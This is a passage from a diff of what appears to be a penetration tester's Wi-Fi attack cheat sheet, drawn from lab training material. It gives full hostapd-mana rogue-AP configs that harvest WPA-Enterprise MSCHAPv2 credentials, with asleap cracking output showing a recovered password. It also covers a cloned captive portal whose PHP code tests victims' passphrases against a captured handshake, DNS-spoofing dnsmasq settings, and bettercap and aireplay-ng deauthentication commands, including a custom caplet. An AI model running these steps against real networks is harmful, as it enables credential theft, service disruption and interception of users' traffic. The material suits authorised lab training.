+  server_cert=/etc/freeradius/3.0/certs/server.pem
+  private_key=/etc/freeradius/3.0/certs/server.key
+  # The password is actually 'whatever'
+  private_key_passwd=whatever
+  dh_file=/etc/freeradius/3.0/certs/dh
+  # Open authentication
+  auth_algs=1
+  # WPA/WPA2
+  wpa=3
+  # WPA Enterprise
+  wpa_key_mgmt=WPA-EAP
+  # Allow CCMP and TKIP
+  # Note: iOS warns when network has TKIP (or WEP)
+  wpa_pairwise=CCMP TKIP
+  # Enable Mana WPE
+  mana_wpe=1
+  # Store credentials in that file
+  mana_credout=/tmp/hostapd.credout
+  # Send EAP success, so the client thinks it's connected
+  mana_eapsuccess=1
+  # EAP TLS MitM
+  mana_eaptls=1
+  ##EOF
+  
+  #HostAPd initiated
+  sudo hostapd-mana /etc/hostapd-mana/mana.conf
+  
+  #HostAPd output with user 'cosmo' authenticating
+  ..
+  wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+  MANA EAP Identity Phase 1: cosmo
+  MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
+  MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
+  MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
+  ..
+  
+  #Running asleap on hostAPd credentials
+  kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+  asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
+  Using wordlist mode with "/usr/share/john/password.lst".
+          hash bytes:        586c
+          NT hash:           8846f7eaee8fb117ad06bdd830b7586c
+          password:          password
+  
+  
+  #Attacking Captive Portals
+  ##########################
+  
+  #Discovery via Airodump-ng
+  sudo airodump-ng -w discovery --output-format pcap wlan0mon
+  
+  #Deauthenticating Clients
+  sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
+  
+  #Building the Captive Portal
+  #Installing Apache and PHP
+  #Downloading MegaCorp One index page and its resources
+  #Copy assets and old-site directories
+  sudo apt install apache2 libapache2-mod-php
+  wget -r -l2 https://www.megacorpone.com
+  sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
+  sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
+  
+  #Changing the Captive Portal login check page
+  #up to -->EOF
+  <?php
+  # Path of the handshake PCAP
+  $handshake_path = '/home/kali/discovery-01.cap';
+  ..
+  # Passphrase entered by the user
+  $passphrase = $_POST['passphrase'];
+  ..
+  # Add passphrase to wordlist ...
+  $wordlist_path = tempnam('/tmp', 'wordlist');
+  ..
+  # ... then crack the PCAP with it to see if it matches
+  # If ESSID contains single quotes, they need escaping
+  exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
+  " -w " . $wordlist_path . " " . $handshake_path, $output, $retval);
+  ..
+  # Save the passphrase and redirect the user to the success page
+    @rename($wordlist_path, $success_path);
+  #EOF
+  
+  #Networking Setup
+  #wlan0 IP address configuration
+  #Installing dnsmasq
+  sudo ip addr add 192.168.87.1/24 dev wlan0
+  sudo ip link set wlan0 up
+  sudo apt install dnsmasq
+  
+  #We will use the following mco-dnsmasq.conf configuration file for DHCP
+  #Up to -->EOF
+  # Main options
+  # http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
+  domain-needed
+  bogus-priv
+  no-resolv
+  filterwin2k
+  expand-hosts
+  domain=localdomain
+  local=/localdomain/
+  # Only listen on this address. When specifying an
+  # interface, it also listens on localhost.
+  # We don't want to interrupt any local resolution
+  # since the DNS responses will be spoofed
+  listen-address=192.168.87.1
+  # DHCP range
+  dhcp-range=192.168.87.100,192.168.87.199,12h
+  dhcp-lease-max=100
+  # This should cover most queries
+  # We can add 'log-queries' to log DNS queries
+  address=/com/192.168.87.1
+  address=/org/192.168.87.1
+  address=/net/192.168.87.1
+  
+  # Entries for Windows 7 and 10 captive portal detection
+  address=/dns.msftncsi.com/131.107.255.255
+  #EOF
+  
+  #Starting dnsmasq
+  sudo dnsmasq --conf-file=mco-dnsmasq.conf
+  
+  #Rogue AP hostapd configuration
+  #Up to -->EOF
+  interface=wlan0
+  ssid=MegaCorp One Lab
+  channel=11
+  # 802.11n
+  hw_mode=g
+  ieee80211n=1
+  # Uncomment the following lines to use OWE instead of an open network
+  #wpa=2
+  #ieee80211w=2
+  #wpa_key_mgmt=OWE
+  #rsn_pairwise=CCMP
+  #EOF
+  
+  #Running hostapd
+  sudo hostapd -B mco-hostapd.conf
+  
+  #Logs from hostapd and dnsmasq
+  sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
+  
+  
+  #bettercap
+  ##########
+  #There are a several commands in the bettercap Wi-Fi module that will be useful to us.
+  #recon:1 Scan the 802.11 spectrum for APs and capture WPA/WPA2 handshakes.
+  #deauth:2 Deauthenticate clients from an AP.
+  #show:3 Display the discovered wireless stations.
+  #ap:4 Create a rogue AP.
+  
+  #Installing bettercap
+  sudo apt install bettercap
+  
+  #Starting bettercap while using wlan0
+  sudo bettercap -iface wlan0
+  
+  #Starting the recon command
+  wlan0  » wifi.recon on
+  
+  #Setting the channels to only 6 and 11
+  wlan0  » wifi.recon.channel 6,11
+  
+  #Running the show Command
+  wlan0  » wifi.show
+  
+  #Using ticker to display wireless stations
+  wlan0  » set ticker.commands "clear; wifi.show"
+  wlan0  » wifi.recon on
+  ..
+  wlan0  » ticker on
+  
+  #Running commands at startup
+  sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
+  
+  #Listing clients on Corporate
+  wlan0  » wifi.recon c6:2d:56:2a:53:f8
+  wlan0  » wifi.show
+  
+  #Filtering clients connected to BSSID that start with the MAC Address "c0"
+  wlan0  » set wifi.show.filter ^c0
+  wlan0  » wifi.show
+  
+  #Listing clients on Corporate
+  wlan0  » set wifi.show.filter ""
+  wlan0  » set wifi.rssi.min -49
+  wlan0  » wifi.show
+  
+  #Deauthenticating All Clients Connected to the "Corporate" AP
+  wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+  
+  #Deauthenticating a Single Client
+  wlan0  » wifi.deauth ac:22:0b:28:fd:22
+  
+  #Changing the File and Aggregate settings
+   wlan1  » wifi.recon off
+   wlan1  » get wifi.handshakes.file 
+    wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'
+   wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"
+   wlan0  » set wifi.handshakes.aggregate false
+   wlan0  » wifi.recon on
+   wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+   ...
+   -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
+  
+  #Unknown BSSID during deauth
+  wlan0  » wifi.deauth AA:BB:CC:DD:EE:FF
+  [15:22:08] [sys.log] [err] aa:bb:cc:dd:ee:ff is an unknown BSSID, is in the deauth skip list
+  
+  #Deauthentication filter
+  wlan0  » set wifi.deauth.skip ac:22:0b:28:fd:22
+  wlan0  » wifi.deauth c6:2d:56:2a:53:f8
+  wlan0  » [15:38:34] [sys.log] [inf] wifi deauthing client c0:ee:fb:1a:d8:8d 
+  
+  #Caplet for mass deauthentication
+  kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
+   1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+  ...
+  
+  #Custom caplet for deauthentication
+  kali@kali:~$ cat -n deauth_corp.cap 
+   1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
+   2
+   3  set ticker.period 10
+   4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
+   5
+   6  events.ignore wifi.ap.new
+   7  events.ignore wifi.client.probe
+   8  events.ignore wifi.client.new
+   9
+  10  wifi.recon on
+  11  ticker on
+  12  events.clear
+  13  clear
+  
+  #Running custom caplet
+  sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+  
+  
+  #kismet
+  #######
+  
+  #Installing Kismet
+  sudo apt install kismet
+  
+  #Kismet configuration files
+  ls -al /etc/kismet/
+  
+  #Kismet configuration information
+  sudo kismet -c wlan0 --no-ncurses
+  
+  #Running Kismet on channels 4, 5, and 6
+  sudo kismet -c wlan0:channels="4,5,6"
+  
+  #Staring Kismet as a daemon
+  sudo kismet --daemonize
+  
+  #Remote Capture
+  #Starting a Kismet server without a data source on kali
+  #Establishing an SSH tunnel with port 8000 forwarded
+  #Starting a remote capture
+  
+  sudo kismet
+  ssh kali@192.168.62.192 -L 8000:localhost:3501
+  sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0
+  
+  #Log files
+  #Opening a kismet file with sqlite
+  sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet
+  
+  #sqlite one-liner
+  sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
+  
+  #Processing a PcapNg file with Kismet
+  sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:realtime=true
+  
+  #Checking datasources in a kismet file
+  kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources
+  
+  #Converting a kismet file to a PcapNg file
+  kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose
+  
+  #Using kismetdb_dump_devices to create a .json file
+  kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose
+  
+  
+  #Wireshark for wifi
+  ###################
+  
+  #displaying only beacon packets by using the filter wlan.fc.type_subtype == 0x08.
+  wlan.fc.type_subtype == 0x08
+  
+  #targeting the Mostar SSID by adding && and using the filter wlan.ssid == "Mostar".
+  wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"
   ```
 
 ### wkhtmltopdf
